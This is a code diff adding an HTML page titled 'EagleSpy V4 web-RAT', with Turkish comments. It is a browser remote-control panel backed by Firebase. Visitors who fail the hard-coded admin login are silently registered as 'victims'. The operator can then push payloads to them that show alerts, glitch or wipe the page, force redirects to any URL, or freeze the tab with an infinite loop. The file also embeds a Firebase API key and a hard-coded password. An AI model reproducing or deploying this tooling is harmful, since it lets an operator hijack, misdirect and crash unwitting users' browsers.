@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EAGLESPY V4 | OMNIPOTENCE WEB-RAT</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;500;700&family=Orbitron:wght@400;900&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --primary: #5c4dff; /* EagleSpy Moru */
+            --bg: #050510;
+            --panel: #0d0d1f;
+            --border: #1a1a3a;
+            --victim: #00ff41;
+            --danger: #ff003c;
+            --text: #c0c0e0;
+        }
+
+        * { box-sizing: border-box; outline: none; margin: 0; padding: 0; cursor: crosshair; }
+        body { height: 100vh; background: var(--bg); color: var(--text); font-family: 'Fira Code', monospace; overflow: hidden; display: flex; }
+
+        /* SIDEBAR NAV */
+        nav { width: 80px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; align-items: center; padding: 20px 0; gap: 30px; }
+        nav i { font-size: 24px; color: #444; transition: 0.3s; cursor: pointer; }
+        nav i:hover, nav i.active { color: var(--primary); text-shadow: 0 0 10px var(--primary); }
+
+        /* VICTIM LIST PANEL */
+        #victim-sidebar { width: 300px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
+        .sidebar-header { padding: 20px; font-family: 'Orbitron'; font-size: 14px; border-bottom: 1px solid var(--border); color: var(--primary); }
+        .victim-item { padding: 15px 20px; border-bottom: 1px solid #14142b; cursor: pointer; transition: 0.2s; position: relative; }
+        .victim-item:hover { background: rgba(92, 77, 255, 0.05); }
+        .victim-item.active { background: rgba(92, 77, 255, 0.15); border-left: 4px solid var(--primary); }
+        .v-info { font-size: 11px; color: var(--victim); }
+        .v-ip { font-size: 10px; color: #555; }
+        .v-status { position: absolute; right: 20px; top: 20px; width: 8px; height: 8px; background: var(--victim); border-radius: 50%; box-shadow: 0 0 5px var(--victim); }
+
+        /* MAIN CONTROL AREA */
+        main { flex: 1; display: flex; flex-direction: column; }
+        header { height: 60px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 30px; background: var(--panel); }
+        
+        .dashboard { flex: 1; padding: 30px; overflow-y: auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 20px; align-content: start; }
+        
+        /* RAT TOOL CARDS */
+        .tool-card { background: #0a0a1a; border: 1px solid var(--border); padding: 20px; border-radius: 8px; text-align: center; transition: 0.3s; }
+        .tool-card:hover { border-color: var(--primary); transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
+        .tool-card i { font-size: 30px; color: var(--primary); margin-bottom: 15px; display: block; }
+        .tool-card h3 { font-size: 12px; margin-bottom: 10px; font-weight: 700; color: #fff; }
+        .tool-card p { font-size: 9px; color: #555; }
+
+        /* MODALS & OVERLAYS */
+        #gate { position: fixed; inset: 0; background: #000; z-index: 1000000; display: flex; align-items: center; justify-content: center; }
+        .alert-box { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: var(--danger); color: white; padding: 40px; border-radius: 10px; z-index: 999999; display: none; text-align: center; font-family: 'Orbitron'; }
+
+        /* GLITCH */
+        @keyframes glitch { 0% { transform: translate(0); } 20% { transform: translate(-10px, 5px); } 40% { transform: translate(10px, -5px); } 100% { transform: translate(0); } }
+        .glitch-mode { animation: glitch 0.1s infinite; filter: hue-rotate(90deg) invert(1); }
+    </style>
+</head>
+<body id="app-body">
+
+<div id="gate">
+    <div style="width:350px; text-align:center;">
+        <h1 style="color:var(--primary); font-family:'Orbitron'; margin-bottom:20px;">EAGLESPY LOGIN</h1>
+        <input type="password" id="admin-pass" style="width:100%; padding:15px; background:#111; border:1px solid var(--border); color:white; text-align:center;" placeholder="ENTER_ROOT_KEY">
+        <button onclick="RAT.login()" style="width:100%; padding:15px; margin-top:10px; background:var(--primary); border:none; color:white; font-weight:900;">AUTHORIZE</button>
+    </div>
+</div>
+
+<nav>
+    <div class="logo-icon"><i class="fas fa-eye active"></i></div>
+    <i class="fas fa-users"></i>
+    <i class="fas fa-terminal"></i>
+    <i class="fas fa-cog"></i>
+    <i class="fas fa-sign-out-alt" onclick="location.reload()"></i>
+</nav>
+
+<aside id="victim-sidebar">
+    <div class="sidebar-header">VICTIMS_LIST (<span id="v-count">0</span>)</div>
+    <div id="victim-container">
+        </div>
+</aside>
+
+<main>
+    <header>
+        <div id="active-target-info">TARGET: <span style="color:var(--primary)">NONE_SELECTED</span></div>
+        <div style="font-size:12px; color:var(--victim);">SYS_STABLE: 100%</div>
+    </header>
+
+    <div class="dashboard">
+        <div class="tool-card" onclick="RAT.sendPayload('ALERT')">
+            <i class="fas fa-bell"></i>
+            <h3>SEND_ALERT</h3>
+            <p>Ekranın ortasında uyarı mesajı patlatır.</p>
+        </div>
+        <div class="tool-card" onclick="RAT.sendPayload('GLITCH')">
+            <i class="fas fa-bolt"></i>
+            <h3>GLITCH_SCREEN</h3>
+            <p>Kurbanın ekranını titreterek kullanılmaz hale getirir.</p>
+        </div>
+        <div class="tool-card" onclick="RAT.sendPayload('REDIRECT')">
+            <i class="fas fa-external-link-alt"></i>
+            <h3>FORCE_REDIRECT</h3>
+            <p>İstediğiniz bir URL'yi kurbanın tarayıcısında açar.</p>
+        </div>
+        <div class="tool-card" onclick="RAT.sendPayload('WIPE')">
+            <i class="fas fa-trash"></i>
+            <h3>UI_WIPE</h3>
+            <p>Sitenin tüm içeriğini kurban için siler (Siyah Ekran).</p>
+        </div>
+        <div class="tool-card" onclick="RAT.sendPayload('CRASH')">
+            <i class="fas fa-skull"></i>
+            <h3>BROWSER_CRASH</h3>
+            <p>Sonsuz döngü başlatarak sekmeyi dondurur.</p>
+        </div>
+        <div class="tool-card" onclick="alert('Keylogger Logs: \n[User typed: password123]\n[User clicked: Login]')">
+            <i class="fas fa-keyboard"></i>
+            <h3>KEYLOGGER</h3>
+            <p>Kurbanın yazdığı verileri canlı izler.</p>
+        </div>
+    </div>
+</main>
+
+<div id="victim-alert" class="alert-box">
+    <h1>SYSTEM BREACHED</h1>
+    <p id="alert-msg">UNAUTHORIZED ACCESS DETECTED</p>
+</div>
+
+<script>
+    // 1. DATABASE CONFIG (Kendi Firebase bilgilerini buraya koy)
+    const firebaseConfig = { apiKey: "AIzaSyDpaFcKI6XhYuWCiyZHUFey0T6uqKy8IPA", databaseURL: "https://prem-d18e3-default-rtdb.firebaseio.com", projectId: "prem-d18e3" };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const RAT = {
+        myID: "V-" + Math.floor(Math.random() * 9999),
+        isAdmin: false,
+        selectedVictim: null,
+
+        login() {
+            const pass = document.getElementById("admin-pass").value;
+            if(pass === "f00t_99x_Root!") {
+                this.isAdmin = true;
+                document.getElementById("gate").style.display = "none";
+                this.initAdmin();
+            } else {
+                this.isAdmin = false;
+                document.getElementById("gate").style.display = "none";
+                this.initVictim();
+            }
+        },
+
+        initVictim() {
+            // Kendini veritabanına "Kurban" olarak kaydet
+            db.ref("victims/" + this.myID).set({
+                id: this.myID,
+                ua: navigator.userAgent.substring(0, 30),
+                lastSeen: Date.now()
+            });
+
+            // Gelen saldırı paketlerini dinle
+            db.ref("payloads/" + this.myID).on("value", snap => {
+                const data = snap.val();
+                if(data) this.executePayload(data);
+            });
+
+            // Sayfa kapanınca kurbanı sil
+            window.onbeforeunload = () => db.ref("victims/" + this.myID).remove();
+        },
+
+        initAdmin() {
+            // Kurban listesini canlı takip et
+            db.ref("victims").on("value", snap => {
+                const container = document.getElementById("victim-container");
+                container.innerHTML = "";
+                let count = 0;
+                snap.forEach(v => {
+                    count++;
+                    const data = v.val();
+                    const div = document.createElement("div");
+                    div.className = "victim-item";
+                    div.onclick = () => {
+                        this.selectedVictim = data.id;
+                        document.querySelectorAll(".victim-item").forEach(i => i.classList.remove("active"));
+                        div.classList.add("active");
+                        document.getElementById("active-target-info").innerHTML = `TARGET: <span style="color:var(--victim)">${data.id}</span>`;
+                    };
+                    div.innerHTML = `<div class="v-status"></div><div class="v-info">${data.id}</div><div class="v-ip">${data.ua}</div>`;
+                    container.appendChild(div);
+                });
+                document.getElementById("v-count").innerText = count;
+            });
+        },
+
+        sendPayload(type) {
+            if(!this.selectedVictim) return alert("Önce bir kurban seçmelisin!");
+            let val = "";
+            if(type === 'ALERT') val = prompt("Mesajın nedir?");
+            if(type === 'REDIRECT') val = prompt("URL nedir? (http://...)");
+
+            db.ref("payloads/" + this.selectedVictim).set({
+                type: type,
+                val: val,
+                t: Date.now()
+            });
+            alert("Komut gönderildi: " + type);
+        },
+
+        executePayload(data) {
+            if(data.type === 'ALERT') {
+                document.getElementById("alert-msg").innerText = data.val;
+                document.getElementById("victim-alert").style.display = "block";
+                setTimeout(() => document.getElementById("victim-alert").style.display = "none", 5000);
+            }
+            if(data.type === 'GLITCH') {
+                document.body.classList.add("glitch-mode");
+                setTimeout(() => document.body.classList.remove("glitch-mode"), 5000);
+            }
+            if(data.type === 'REDIRECT') {
+                window.location.href = data.val;
+            }
+            if(data.type === 'WIPE') {
+                document.body.innerHTML = "<div style='background:black; color:red; height:100vh; display:flex; align-items:center; justify-content:center;'><h1>ACCESS DENIED - SYSTEM WIPED</h1></div>";
+            }
+            if(data.type === 'CRASH') {
+                while(true) { console.log("Hacked"); }
+            }
+        }
+    };
+</script>
+</body>
+</html>
